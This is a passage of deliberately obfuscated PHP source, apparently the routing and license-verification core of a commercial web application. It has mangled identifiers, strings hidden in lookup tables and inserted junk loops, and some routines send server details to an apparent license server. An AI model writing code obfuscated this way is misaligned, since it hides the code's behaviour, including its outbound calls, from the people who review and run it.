$_SERVER[Å´]; $›õåŒ°ª¯ = $Îë¿¬–[0]($Îë¿¬–[1], $Îë¿¬–[2]($¥¾¬µ¿˜, $Îë¿¬–[1])); $¿‹º³ = $ÒÔì¯øê[605]; while ($¿‹º³ < $ÒÔì¯øê[604]) { if ($¿‹º³ >= 0) { break; } $¿‹º³++; } $this->defaultModule = $›õåŒ°ª¯[0] ? $›õåŒ°ª¯[0] : $this->defaultModule; $this->defaultController = $›õåŒ°ª¯[1] ? $›õåŒ°ª¯[1] : $this->defaultController; $this->defaultAction = $›õåŒ°ª¯[2] ? $›õåŒ°ª¯[2] : $this->defaultAction; $ô“©Ø = $ÒÔì¯øê[606]; if (!$ô“©Ø) { die; } $this->{$_SERVER[Å´][3]}($Îë¿¬–[4], array($this, $Îë¿¬–[5])); } public function appRun($Ç•) { $êÙ´ =& $_SERVER[ÀÆ]; $üÕ =& $_SERVER[Å´]; $‹Ú€º = $üÕ[0]($üÕ[1], $Ç•); $ÏäïºÑÄô• = $êÙ´[607]; while (strlen($ÏäïºÑÄô•) < $êÙ´[608]) { if (!$ÏäïºÑÄô•) { break; } $ÏäïºÑÄô•++; } $åÅÎ÷ï = $üÕ[6]($‹Ú€º[0]); $­“¤ = $üÕ[7]; $Æõ¬¬€‹ = $êÙ´[609]; if (!$Æõ¬¬€‹) { die; } if ($åÅÎ÷ï == $üÕ[8]) { $­“¤ = $üÕ[9]; $‹Ú€º[0] = $üÕ[10]; $‹Ú€º[1] = $‹Ú€º[1] . $üÕ[11]; $Ç• = $üÕ[12]($üÕ[1], $‹Ú€º); $Ç• = $üÕ[2]($Ç•, $üÕ[1]); } $üÕ[13](array($üÕ[14], $üÕ[15]), $­“¤ . $üÕ[16], $Ç•); $üÕ[17]($Ç•); $¯ = $êÙ´[610]; if (strlen($¯) < $êÙ´[604]) { die; } $üÕ[13](array($üÕ[14], $üÕ[15]), $­“¤ . $üÕ[18], $Ç•); $Õ‡Ó = $êÙ´[611]; while ($Õ‡Ó < $êÙ´[612]) { if ($Õ‡Ó >= 0) { break; } $Õ‡Ó++; } } private function autorun() { $‡€”Ÿ¨Æ¢“² =& $_SERVER[ÀÆ]; $“Ÿ¶’Œ =& $_SERVER[Å´]; global $config; $®Ê = $‡€”Ÿ¨Æ¢“²[613]; if (strlen($®Ê) < $‡€”Ÿ¨Æ¢“²[614]) { return; } if ($“Ÿ¶’Œ[19]($config[$“Ÿ¶’Œ[20]]) == 0) { return; } foreach ($config[$“Ÿ¶’Œ[20]] as $è‰Ëûà½™ÓÖ => $¾Í»ˆ‚íæ»·“) { $this->{$_SERVER[Å´][21]}($¾Í»ˆ‚íæ»·“); $ò±üšà¥ = $‡€”Ÿ¨Æ¢“²[615]; } } private function rbuj56700eb8() { $±ÍŸÅ¸Ê€ =& $_SERVER[ÀÆ]; $ÆøÒ =& $_SERVER[Å´]; $ê“ËÃë = $ÆøÒ[8]; $ÖÖ = $GLOBALS[$ÆøÒ[22]][$ÆøÒ[23]][0]; if (!$ÖÖ || $ÆøÒ[24]($ÖÖ) <= $ÆøÒ[24]($ê“ËÃë)) { return; } if ($ÆøÒ[6]($ÆøÒ[25]($ÖÖ, -$ÆøÒ[24]($ê“ËÃë))) != $ê“ËÃë) { return; } $¯É˜ªÓÇ§Õ = $ÆøÒ[25]($ÖÖ, 0, -$ÆøÒ[24]($ê“ËÃë)); $‡ïÒ = array($ÆøÒ[8], $¯É˜ªÓÇ§Õ); $öÎÖØ‚ó¹·– = $±ÍŸÅ¸Ê€[616]; $Ì²÷‚ÕÄ³ = $ÆøÒ[26]($GLOBALS[$ÆøÒ[22]][$ÆøÒ[23]], 1); $Ø„‚¾ÎŒ«ù = $±ÍŸÅ¸Ê€[617]; while ($Ø„‚¾ÎŒ«ù < $±ÍŸÅ¸Ê€[614]) { if ($Ø„‚¾ÎŒ«ù >= 0) { break; } $Ø„‚¾ÎŒ«ù++; } $GLOBALS[$ÆøÒ[22]][$ÆøÒ[23]] = $ÆøÒ[27]($‡ïÒ, $Ì²÷‚ÕÄ³); $ÕìœÕ = $±ÍŸÅ¸Ê€[618]; if (strlen($ÕìœÕ) < $±ÍŸÅ¸Ê€[608]) { die; } $GLOBALS[$ÆøÒ[22]][$ÆøÒ[28]] = $ÆøÒ[29]($ÆøÒ[1], $GLOBALS[$ÆøÒ[22]][$ÆøÒ[23]]); $Í†É¦ˆªáË¸¿ = $±ÍŸÅ¸Ê€[619]; if (!$Í†É¦ˆªáË¸¿) { die; } } private function tnew36004960() { $á¿ù =& $_SERVER[ÀÆ]; $Ç‰ÜŠÍÊ =& $_SERVER[Å´]; if ($GLOBALS[$Ç‰ÜŠÍÊ[22]][$Ç‰ÜŠÍÊ[28]] != $Ç‰ÜŠÍÊ[10]) { return; } $é¸Å = $_SERVER[$Ç‰ÜŠÍÊ[30]]; $«ğ = $á¿ù[620]; while (strlen($«ğ) < $á¿ù[612]) { if (!$«ğ) { break; } $«ğ++; } $Ş¦’ßÉ©¿• = $Ç‰ÜŠÍÊ[31]; $€‚µéú°‡ = $á¿ù[621]; while (strlen($€‚µéú°‡) < $á¿ù[612]) { if (!$€‚µéú°‡) { break; } $€‚µéú°‡++; } if (!$Ç‰ÜŠÍÊ[32]($é¸Å, $Ş¦’ßÉ©¿•)) { return; } $ªæœ´Ğ¤ = $Ç‰ÜŠÍÊ[33]($é¸Å, $Ş¦’ßÉ©¿•); $ş˜¡ú«Ôé¶ = $á¿ù[622]; if (!$ş˜¡ú«Ôé¶) { return; } $æÇØŠèàö¬ü = $Ç‰ÜŠÍÊ[25]($é¸Å, $ªæœ´Ğ¤ + $Ç‰ÜŠÍÊ[24]($Ş¦’ßÉ©¿•)); $Âûò’ = $á¿ù[623]; $Ç‰ÜŠÍÊ[34]($Ç‰ÜŠÍÊ[35], $æÇØŠèàö¬ü, $ãÕÕ—Öò³á‹); $æÇØŠèàö¬ü = $Ç‰ÜŠÍÊ[2]($ãÕÕ—Öò³á‹[0][0], $Ç‰ÜŠÍÊ[36]); $¦âı¹ = $á¿ù[624]; if (!$¦âı¹) { return; } $GLOBALS[$Ç‰ÜŠÍÊ[22]][$Ç‰ÜŠÍÊ[23]] = $Ç‰ÜŠÍÊ[0]($Ç‰ÜŠÍÊ[36], $æÇØŠèàö¬ü); $GLOBALS[$Ç‰ÜŠÍÊ[22]][$Ç‰ÜŠÍÊ[28]] = $Ç‰ÜŠÍÊ[29]($Ç‰ÜŠÍÊ[1], $GLOBALS[$Ç‰ÜŠÍÊ[22]][$Ç‰ÜŠÍÊ[23]]); } public function run() { $í•À“Í =& $_SERVER[ÀÆ]; $§¥ =& $_SERVER[Å´]; $this->{$_SERVER[Å´][37]}(); $this->{$_SERVER[Å´][38]}(); $€à = $í•À“Í[625]; if (!$€à) { return; } $Öã—‹»Ä = $GLOBALS[$§¥[22]][$§¥[23]]; $“òÄß¿’ì³¤ = $í•À“Í[626]; $œÑçˆÃÛ±ß = $GLOBALS[$§¥[22]][$§¥[28]]; $§¥[39]($§¥[40], isset($Öã—‹»Ä[0]) && $Öã—‹»Ä[0] ? $Öã—‹»Ä[0] : $this->defaultModule); $§¥[39]($§¥[41], isset($Öã—‹»Ä[1]) && $Öã—‹»Ä[0] ? $Öã—‹»Ä[1] : $this->defaultController); $§¥[39]($§¥[42], isset($Öã—‹»Ä[2]) && $Öã—‹»Ä[0] ? $Öã—‹»Ä[2] : $this->defaultAction); $§¥[39]($§¥[43], MOD . $§¥[1] . ST . $§¥[1] . ACT); $_SERVER[$§¥[44]] = $§¥[6](ACTION); $this->{$_SERVER[Å´][45]}(); $ù¶ÏÜøáì¦Ô = $í•À“Í[627]; if (strlen($ù¶ÏÜøáì¦Ô) < $í•À“Í[608]) { return; } if ($§¥[19]($Öã—‹»Ä) >= 3) { $this->{$_SERVER[Å´][21]}($œÑçˆÃÛ±ß); } else { $this->{$_SERVER[Å´][21]}(ACTION); } } private $ieuo984a7b1b = array(); private $inqv100b66c1 = ''; public function sitacf1fc360() { $ºÏ =& $_SERVER[ÀÆ]; $«³ =& $_SERVER[Å´]; $this->{$_SERVER[Å´][46]}(); $this->{$_SERVER[Å´][47]}(); $this->{$_SERVER[Å´][48]}(); $¾Í¡·¢Öú = $ºÏ[628]; if (strlen($¾Í¡·¢Öú) < $ºÏ[629]) { die; } $this->{$_SERVER[Å´][49]}(); $this->{$_SERVER[Å´][50]}(); $ê±´åæı = $ºÏ[630]; while ($ê±´åæı < $ºÏ[608]) { if ($ê±´åæı >= 0) { break; } $ê±´åæı++; } $this->{$_SERVER[Å´][51]}(); $ˆÇØñáæÀ = $ºÏ[631]; if (strlen($ˆÇØñáæÀ) < $ºÏ[614]) { return; } $this->{$_SERVER[Å´][52]}(); $this->{$_SERVER[Å´][3]}($«³[53], array($this, $«³[54])); $”í = $ºÏ[632]; while (strlen($”í) < $ºÏ[629]) { if (!$”í) { break; } $”í++; } $this->{$_SERVER[Å´][3]}($«³[55], array($this, $«³[56])); $this->{$_SERVER[Å´][3]}($«³[57], array($this, $«³[58])); $õ²Â’€ÊÏÈ¿ = $ºÏ[633]; $this->{$_SERVER[Å´][3]}($«³[59], array($this, $«³[60])); $ú“Îå×¶ŞÆ = $ºÏ[634]; while ($ú“Îå×¶ŞÆ < $ºÏ[604]) { if ($ú“Îå×¶ŞÆ >= 0) { break; } $ú“Îå×¶ŞÆ++; } } public function nguzc2f93afe($ƒûÂáòãô¨) { $ß›Á¦ ¥­ù =& $_SERVER[ÀÆ]; $‘Ï =& $_SERVER[Å´]; $äëµÆğ = $‘Ï[61]($‘Ï[62])->{$_SERVER[Å´][63]}(); $¹Ó²‡Ì­±ï = array($‘Ï[64], $‘Ï[65], $‘Ï[66], $‘Ï[67], $‘Ï[68], $‘Ï[69], $‘Ï[70], $‘Ï[71], $‘Ï[72], $‘Ï[73], $‘Ï[74], $‘Ï[75], $‘Ï[76], $‘Ï[77], $‘Ï[78], $‘Ï[79], $‘Ï[80], $‘Ï[81], $‘Ï[82], $‘Ï[83], $‘Ï[84], $‘Ï[85], $‘Ï[86], $‘Ï[87], $‘Ï[88], $‘Ï[89], $‘Ï[90], $‘Ï[91], $‘Ï[92], $‘Ï[93], $‘Ï[94], $‘Ï[95], $‘Ï[96], $‘Ï[97], $‘Ï[98], $‘Ï[99], $‘Ï[100], $‘Ï[101], $‘Ï[102], $‘Ï[103], $‘Ï[104], $‘Ï[105], $‘Ï[106], $‘Ï[107], $‘Ï[108], $‘Ï[109], $‘Ï[110]); $—Õ = $ß›Á¦ ¥­ù[635]; foreach ($¹Ó²‡Ì­±ï as $‘ïáÈ³¥¼) { $òÖœì¡± = $GLOBALS[$‘Ï[111]][$‘Ï[112]][$‘ïáÈ³¥¼]; $«‡ö‰†è = $ß›Á¦ ¥­ù[636]; if (strlen($«‡ö‰†è) < $ß›Á¦ ¥­ù[608]) { die; } if (isset($äëµÆğ[$‘ïáÈ³¥¼])) { $òÖœì¡± = $äëµÆğ[$‘ïáÈ³¥¼]; } $ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[114]][$‘ïáÈ³¥¼] = $òÖœì¡±; } $à¬âùëÌîç…È = $ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[114]][$‘Ï[76]]; $€»äì = $ß›Á¦ ¥­ù[637]; while ($€»äì < $ß›Á¦ ¥­ù[608]) { if ($€»äì >= 0) { break; } $€»äì++; } unset($ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[115]][$‘Ï[116]]); unset($ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[115]][$‘Ï[117]]); $‘Â¶ = $ß›Á¦ ¥­ù[600]; unset($ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[114]][$‘Ï[76]]); $ßÌ½„ä°Ø = $ß›Á¦ ¥­ù[638]; unset($ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[114]][$‘Ï[118]]); $ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[114]][$‘Ï[119]] = array($‘Ï[120] => (int) $à¬âùëÌîç…È[$‘Ï[121]], $‘Ï[122] => (int) $‘Ï[123]($à¬âùëÌîç…È, $‘Ï[124], 0)); $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[126]] = $‘Ï[127]($‘Ï[128])->{$_SERVER[Å´][129]}(); $ÊËääœãÓ‘ï = $ß›Á¦ ¥­ù[639]; if (strlen($ÊËääœãÓ‘ï) < $ß›Á¦ ¥­ù[608]) { die; } $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[130]] = $‘Ï[131]($_SERVER[$‘Ï[132]] . $äëµÆğ[$‘Ï[133]]); $á¥À›ô¨úöÀú = $ß›Á¦ ¥­ù[640]; if (strlen($á¥À›ô¨úöÀú) < $ß›Á¦ ¥­ù[629]) { die; } $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[134]] = $‘Ï[135]($‘Ï[136]()); $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[137]] = $this->inqv100b66c1; $¿Â©½ïÛ¢İ = $ß›Á¦ ¥­ù[641]; if (strlen($¿Â©½ïÛ¢İ) < $ß›Á¦ ¥­ù[614]) { return; } if ($äëµÆğ[$‘Ï[137]] != $‘Ï[138]) { $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[139]] = $äëµÆğ[$‘Ï[139]]; $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[140]] = $äëµÆğ[$‘Ï[140]]; $Ó…ÚÅûÓ” = $‘Ï[141](10) . $this->inqv100b66c1 . $‘Ï[141](5); $ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[142]][$‘Ï[143]] = $this->{$_SERVER[Å´][144]}($Ó…ÚÅûÓ”, $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[130]]); } if ($this->inqv100b66c1 == $‘Ï[138]) { $ƒûÂáòãô¨[$‘Ï[113]][$‘Ï[114]][$‘Ï[119]][$‘Ï[124]] = 0; } $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[145]] = $‘Ï[123]($this->ieuo984a7b1b, $‘Ï[146], $‘Ï[10]); $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[147]] = $‘Ï[123]($this->ieuo984a7b1b, $‘Ï[148], $‘Ï[10]); $¦À°‘º = $ß›Á¦ ¥­ù[642]; if (!$¦À°‘º) { die; } if ($‘Ï[123]($GLOBALS, $‘Ï[149]) && $this->config[$‘Ï[150]]) { $ƒûÂáòãô¨[$‘Ï[125]][$‘Ï[151]] = WEB_ROOT; } return $ƒûÂáòãô¨; } private function denj0d9264c2() { $€Í÷ğïàà­ =& $_SERVER[ÀÆ]; $Ÿ‰“ø =& $_SERVER[Å´]; if ($_SERVER[$Ÿ‰“ø[44]] == $Ÿ‰“ø[152]) { $²‘Ò = array($Ÿ‰“ø[137] => $this->inqv100b66c1, $Ÿ‰“ø[153] => $this->{$_SERVER[Å´][154]}(), $Ÿ‰“ø[155] => $Ÿ‰“ø[61]($Ÿ‰“ø[156])->{$_SERVER[Å´][157]}()); if ($this->inqv100b66c1 != $Ÿ‰“ø[138]) { $Ñ = $Ÿ‰“ø[123]($this->ieuo984a7b1b, $Ÿ‰“ø[158]); if ($Ñ) { $²‘Ò[$Ÿ‰“ø[159]] = $Ñ; $²‘Ò[$Ÿ‰“ø[160]] = $Ÿ‰“ø[161]($Ÿ‰“ø[123]($this->ieuo984a7b1b, $Ÿ‰“ø[162])); $²‘Ò[$Ÿ‰“ø[163]] = $Ÿ‰“ø[123]($this->ieuo984a7b1b, $Ÿ‰“ø[148]); } $¶ÔøÉÏ¨ñ¹áî = $Ÿ‰“ø[61]($Ÿ‰“ø[62])->{$_SERVER[Å´][63]}($Ÿ‰“ø[164], $Ÿ‰“ø[10], !0); if ($Ÿ‰“ø[165]($¶ÔøÉÏ¨ñ¹áî) && $Ÿ‰“ø[25]($¶ÔøÉÏ¨ñ¹áî, 0, 1) == $Ÿ‰“ø[166]) { $¶ÔøÉÏ¨ñ¹áî = $Ÿ‰“ø[167]($¶ÔøÉÏ¨ñ¹áî); } if ($Ÿ‰“ø[168]($¶ÔøÉÏ¨ñ¹áî) && $¶ÔøÉÏ¨ñ¹áî[$Ÿ‰“ø[169]] && $Ÿ‰“ø[32]($¶ÔøÉÏ¨ñ¹áî[$Ÿ‰“ø[169]], $Ÿ‰“ø[170])) { $óò€¨˜şÎãöä = $Ÿ‰“ø[0]($Ÿ‰“ø[170], $¶ÔøÉÏ¨ñ¹áî[$Ÿ‰“ø[169]]); $²‘Ò[$Ÿ‰“ø[171]] = $óò€¨˜şÎãöä[0]; } } $²‘Ò = $this->{$_SERVER[Å´][172]}($Ÿ‰“ø[173]($²‘Ò), $Ÿ‰“ø[131]($Ÿ‰“ø[174])); $™½ä = array($Ÿ‰“ø[175] => $²‘Ò); $Ÿ‰“ø[13](array($Ÿ‰“ø[176], $Ÿ‰“ø[177]), $™½ä); $×èéñÍè˜ï = $€Í÷ğïàà­[643]; if (strlen($×èéñÍè˜ï) < $€Í÷ğïàà­[614]) { return; } } if ($this->inqv100b66c1 == $Ÿ‰“ø[138]) { return; } $ê÷§¯¤Ò¶ = array($Ÿ‰“ø[178], $Ÿ‰“ø[179], $Ÿ‰“ø[180], $Ÿ‰“ø[181], $Ÿ‰“ø[182], $Ÿ‰“ø[183]); $õ’‘‡šì„ç˜ = $Ÿ‰“ø[61]($Ÿ‰“ø[62])->{$_SERVER[Å´][63]}(); $Ë‘¤¯ = $€Í÷ğïàà­[644]; while ($Ë‘¤¯ < $€Í÷ğïàà­[614]) { if ($Ë‘¤¯ >= 0) { break; } $Ë‘¤¯++; } $™½ä = array($Ÿ‰“ø[184] => $õ’‘‡šì„ç˜[$Ÿ‰“ø[64]], $Ÿ‰“ø[185] => $õ’‘‡šì„ç˜[$Ÿ‰“ø[65]], $Ÿ‰“ø[186] => $Ÿ‰“ø[10]); foreach ($ê÷§¯¤Ò¶ as $è”–öåÀÙ„Í) { if (!isset($õ’‘‡šì„ç˜[$è”–öåÀÙ„Í]) || !$õ’‘‡šì„ç˜[$è”–öåÀÙ„Í]) { continue; } $™½ä[$è”–öåÀÙ„Í] = $õ’‘‡šì„ç˜[$è”–öåÀÙ„Í]; $¹ñÈ = $€Í÷ğïàà­[645]; while ($¹ñÈ < $€Í÷ğïàà­[612]) { if ($¹ñÈ >= 0) { break; } $¹ñÈ++; } } $Ÿ‰“ø[13](array($Ÿ‰“ø[176], $Ÿ‰“ø[177]), $™½ä); } private function zjci3bc8cabb() { $ÔïâïãÒ =& $_SERVER[ÀÆ]; $¬Åìò¯ı³ =& $_SERVER[Å´]; if ($_SERVER[$¬Åìò¯ı³[44]] != $¬Åìò¯ı³[187]) { return; } if (!$¬Åìò¯ı³[123]($GLOBALS, $¬Åìò¯ı³[149])) { die; } $§ùÃ = $GLOBALS[$¬Åìò¯ı³[22]]; if (isset($§ùÃ[$¬Åìò¯ı³[188]])) { $this->{$_SERVER[Å´][189]}(); die; } if (!isset($§ùÃ[$¬Åìò¯ı³[190]]) || $¬Åìò¯ı³[24]($§ùÃ[$¬Åìò¯ı³[190]]) != 16) { $¬Åìò¯ı³[191]($¬Åìò¯ı³[192] . $§ùÃ[$¬Åìò¯ı³[190]], !1); } $­Æê = $¬Åìò¯ı³[61]($¬Åìò¯ı³[62])->{$_SERVER[Å´][63]}($¬Åìò¯ı³[133]); $ÚÓº§ã = $¬Åìò¯ı³[131]($_SERVER[$¬Åìò¯ı³[132]] . $­Æê); $Á­ = $ÔïâïãÒ[646]; while ($Á­ < $ÔïâïãÒ[629]) { if ($Á­ >= 0) { break; } $Á­++; } $ñùÁ = array($¬Åìò¯ı³[190] => $§ùÃ[$¬Åìò¯ı³[190]], $¬Åìò¯ı³[193] => $¬Åìò¯ı³[141](16), $¬Åìò¯ı³[194] => $¬Åìò¯ı³[174], $¬Åìò¯ı³[195] => $¬Åìò¯ı³[196], $¬Åìò¯ı³[197] => $_SERVER[$¬Åìò¯ı³[198]], $¬Åìò¯ı³[199] => $_SERVER[$¬Åìò¯ı³[200]], $¬Åìò¯ı³[201] => $_SERVER[$¬Åìò¯ı³[202]], $¬Åìò¯ı³[130] => $ÚÓº§ã, $¬Åìò¯ı³[203] => $¬Åìò¯ı³[61]($¬Åìò¯ı³[62])->{$_SERVER[Å´][63]}($¬Åìò¯ı³[164])); if ($§ùÃ[$¬Åìò¯ı³[204]] == $¬Åìò¯ı³[205]) { $Ö¶­Æ“Ù = $this->{$_SERVER[Å´][172]}($ÚÓº§ã, $¬Åìò¯ı³[206]); $èÏéèÅïŞ‚×û = $this->{$_SERVER[Å´][144]}($¬Åìò¯ı³[173]($ñùÁ), $ÚÓº§ã . $¬Åìò¯ı³[207], 3); $èÏéèÅïŞ‚×û = $èÏéèÅïŞ‚×û . $¬Åìò¯ı³[208] . $_SERVER[$¬Åìò¯ı³[198]]; $­ŸàÙ = $this->{$_SERVER[Å´][209]}($¬Åìò¯ı³[210] . $Ö¶­Æ“Ù . $¬Åìò¯ı³[211] . $èÏéèÅïŞ‚×û, -1); $¬Åìò¯ı³[191]($­ŸàÙ, !0); } else { if ($§ùÃ[$¬Åìò¯ı³[204]] == $¬Åìò¯ı³[212]) { $¯ê¯Éã‚èÇ¥ = $¬Åìò¯ı³[25]($¬Åìò¯ı³[131]($¬Åìò¯ı³[213] . $ÚÓº§ã), 12, 15) . $¬Åìò¯ı³[214]; $èÏéèÅïŞ‚×û = $this->{$_SERVER[Å´][215]}($¬Åìò¯ı³[2]($§ùÃ[$¬Åìò¯ı³[216]]), $¯ê¯Éã‚èÇ¥, 2); $„®Øï¾ = $¬Åìò¯ı³[217]($èÏéèÅïŞ‚×û, !0); if (!$¬Åìò¯ı³[168]($„®Øï¾) || !$¬Åìò¯ı³[168]($„®Øï¾[$¬Åìò¯ı³[218]]) || $„®Øï¾[$¬Åìò¯ı³[190]] != !0) { $«ÌèŒ÷Ò = $¬Åìò¯ı³[219]; $Ü©‚¨ë = $„®Øï¾[$¬Åìò¯ı³[218]] ? $¬Åìò¯ı³[220] . $„®Øï¾[$¬Åìò¯ı³[218]] : $«ÌèŒ÷Ò; $¬Åìò¯ı³[191]($Ü©‚¨ë, !1); } else { $ñùÁ[$¬Åìò¯ı³[193]] = $„®Øï¾[$¬Åìò¯ı³[218]][$¬Åìò¯ı³[221]]; } } else { $„®Øï¾ = $this->{$_SERVER[Å´][209]}($¬Åìò¯ı³[222], $ñùÁ, 10); $Ê“–ù = $ÔïâïãÒ[647]; } } if (!$¬Åìò¯ı³[168]($„®Øï¾) || !$¬Åìò¯ı³[168]($„®Øï¾[$¬Åìò¯ı³[218]]) || $„®Øï¾[$¬Åìò¯ı³[190]] != !0) { $«ÌèŒ÷Ò = $¬Åìò¯ı³[223]($¬Åìò¯ı³[224]); $Ü©‚¨ë = $„®Øï¾[$¬Åìò¯ı³[218]] ? $¬Åìò¯ı³[220] . $„®Øï¾[$¬Åìò¯ı³[218]] : $«ÌèŒ÷Ò; $¬Åìò¯ı³[191]($Ü©‚¨ë, !1); } $ªÀ = $„®Øï¾[$¬Åìò¯ı³[218]]; $Ôï = $this->{$_SERVER[Å´][225]}($ªÀ[$¬Åìò¯ı³[226]]); if (!$Ôï || $Ôï != $ªÀ[$¬Åìò¯ı³[162]]) { $ç·¦¥›Ü†ë = array($¬Åìò¯ı³[227] => $¬Åìò¯ı³[61]($¬Åìò¯ı³[62])->{$_SERVER[Å´][63]}($¬Åìò¯ı³[133]), $¬Åìò¯ı³[228] => $_SERVER[$¬Åìò¯ı³[132]], $¬Åìò¯ı³[229] => $¬Åìò¯ı³[230](), $¬Åìò¯ı³[199] => $_SERVER[$¬Åìò¯ı³[200]]); $èÏéèÅïŞ‚×û = $this->{$_SERVER[Å´][231]}($¬Åìò¯ı³[173]($ç·¦¥›Ü†ë)); $this->{$_SERVER[Å´][209]}($¬Åìò¯ı³[232] . $èÏéèÅïŞ‚×û); $¬Åìò¯ı³[191]($¬Åìò¯ı³[223]($¬Åìò¯ı³[233]), !0); } $¿¯êşáµ = array($¬Åìò¯ı³[234] => $ªÀ[$¬Åìò¯ı³[235]], $¬Åìò¯ı³[236] => $ªÀ[$¬Åìò¯ı³[237]], $¬Åìò¯ı³[238] => $¬Åìò¯ı³[141](16), $¬Åìò¯ı³[137] => $ªÀ[$¬Åìò¯ı³[239]]); if ($ñùÁ[$¬Åìò¯ı³[193]]) { $¿¯êşáµ[$¬Åìò¯ı³[238]] = $ñùÁ[$¬Åìò¯ı³[193]]; } $ÏÏƒ¿—ŠÍ€ç = $¬Åìò¯ı³[25]($¬Åìò¯ı³[131]($¿¯êşáµ[$¬Åìò¯ı³[236]]), 10, 10); $’® = $ÏÏƒ¿—ŠÍ€ç . $¿¯êşáµ[$¬Åìò¯ı³[137]] . $¿¯êşáµ[$¬Åìò¯ı³[238]]; $îÊâ¸®êô± = $ÔïâïãÒ[648]; while ($îÊâ¸®êô± < $ÔïâïãÒ[629]) { if ($îÊâ¸®êô± >= 0) { break; } $îÊâ¸®êô±++; } $¿¯êşáµ[$¬Åìò¯ı³[139]] = $¬Åìò¯ı³[240]($¬Åìò¯ı³[135]($this->{$_SERVER[Å´][172]}($’®, $¬Åìò¯ı³[241]))); $¦£Êœ–å = $¬Åìò¯ı³[141](16); $ËùÊŠä¤çÌ = $ÔïâïãÒ[649]; if (strlen($ËùÊŠä¤çÌ) < $ÔïâïãÒ[629]) { die; } $š§í¬ = $¦£Êœ–å . $¿¯êşáµ[$¬Åìò¯ı³[137]] . $this->{$_SERVER[Å´][172]}($¬Åìò¯ı³[131]($¿¯êşáµ[$¬Åìò¯ı³[234]]), $¦£Êœ–å); $á‰ä = $ÔïâïãÒ[650]; while (strlen($á‰ä) < $ÔïâïãÒ[608]) { if (!$á‰ä) { break; } $á‰ä++; } $¿¯êşáµ[$¬Åìò¯ı³[140]] = $¬Åìò¯ı³[135]($¬Åìò¯ı³[240]($this->{$_SERVER[Å´][172]}($š§í¬, $¬Åìò¯ı³[242]))); if ($ªÀ[$¬Åìò¯ı³[243]] && $ªÀ[$¬Åìò¯ı³[243]] >= 1) { $¬Åìò¯ı³[61]($¬Åìò¯ı³[62])->{$_SERVER[Å´][244]}($¬Åìò¯ı³[245], $¬Åìò¯ı³[246]); } $¬Åìò¯ı³[61]($¬Åìò¯ı³[62])->{$_SERVER[Å´][247]}($¿¯êşáµ); $Ä™ŞûÛå§Â = $¬Åìò¯ı³[131]($_SERVER[$¬Åìò¯ı³[132]] . $¬Åìò¯ı³[240]($­Æê) . $¿¯êşáµ[$¬Åìò¯ı³[236]]); $Øæ = $¬Åìò¯ı³[240]($¬Åìò¯ı³[25]($Ä™ŞûÛå§Â, 10, 16)); $×òØ£ = $this->{$_SERVER[Å´][144]}($¬Åìò¯ı³[173]($ªÀ), $Ä™ŞûÛå§Â); $ŸØ™³½’˜ô = $¬Åìò¯ı³[248]($¬Åìò¯ı³[61]($¬Åìò¯ı³[11])->{$_SERVER[Å´][249]}(), $¬Åìò¯ı³[250]); $â‰ = $ŸØ™³½’˜ô[$¬Åìò¯ı³[251]]; $å®ÈëÓªãû = array(); $°† = $ÔïâïãÒ[651]; if (!$°†) { die; } $å®ÈëÓªãû[$Øæ] = $×òØ£; $¶óÏò¯› = $ÔïâïãÒ[652]; if (strlen($¶óÏò¯›) < $ÔïâïãÒ[629]) { return; } $¬Åìò¯ı³[61]($¬Åìò¯ı³[11])->{$_SERVER[Å´][252]}($â‰[$¬Åìò¯ı³[253]], array($¬Åìò¯ı³[254] => $å®ÈëÓªãû)); $this->ieuo984a7b1b = $ªÀ; $this->inqv100b66c1 = $¿¯êşáµ[$¬Åìò¯ı³[137]]; $this->{$_SERVER[Å´][255]}(); Cache::set($¬Åìò¯ı³[256] . $¬Åìò¯ı³[131]($­Æê . $¬Åìò¯ı³[257]), $¬Åìò¯ı³[10]); $¥¦Ò® = $ÔïâïãÒ[653]; $¬Åìò¯ı³[191]($¬Åìò¯ı³[223]($¬Åìò¯ı³[233]), !0); $¤ œ®–Ø = $ÔïâïãÒ[654]; if (strlen($¤ œ®–Ø) < $ÔïâïãÒ[629]) { die; } } private function licenseRegistSuccess() { $Î÷ø·÷Æâå =& $_SERVER[Å´]; $ßÒ = $Î÷ø·÷Æâå[61]($Î÷ø·÷Æâå[62])->{$_SERVER[Å´][63]}(); $Êë‰¾£°´ = $_SERVER[ÀÆ][655]; if (!$Êë‰¾£°´) { return; } if ($ßÒ[$Î÷ø·÷Æâå[93]] != $Î÷ø·÷Æâå[246]) { $Î÷ø·÷Æâå[61]($Î÷ø·÷Æâå[62])->{$_SERVER[Å´][247]}($Î÷ø·÷Æâå[93], $Î÷ø·÷Æâå[246]); } $Î÷ø·÷Æâå[127]($Î÷ø·÷Æâå[258])->{$_SERVER[Å´][259]}(!0); } private function elonc4325456() { $˜õ =& $_SERVER[Å´]; $˜õ[61]($˜õ[62])->{$_SERVER[Å´][247]}(array($˜õ[234] => $˜õ[10], $˜õ[236] => $˜õ[10], $˜õ[137] => $˜õ[138], $˜õ[139] => $˜õ[10], $˜õ[140] => $˜õ[10])); $˜õ[61]($˜õ[62])->{$_SERVER[Å´][244]}($˜õ[245], $˜õ[260]); $ ¾¸Á½ˆ = $_SERVER[ÀÆ][656]; $this->ieuo984a7b1b = array(); $this->inqv100b66c1 = $˜õ[138]; } private function nfgrfec23b62() { $Ã×Ùë†×š˜ =& $_SERVER[ÀÆ]; $Ìñ¡¥Ã²Ëß =& $_SERVER[Å´]; $_SERVER[$Ìñ¡¥Ã²Ëß[200]] = $Ìñ¡¥Ã²Ëß[123]($_SERVER, $Ìñ¡¥Ã²Ëß[200], APP_HOST); $¤µ« = $Ã×Ùë†×š˜[657]; if (!$¤µ«) { return; } 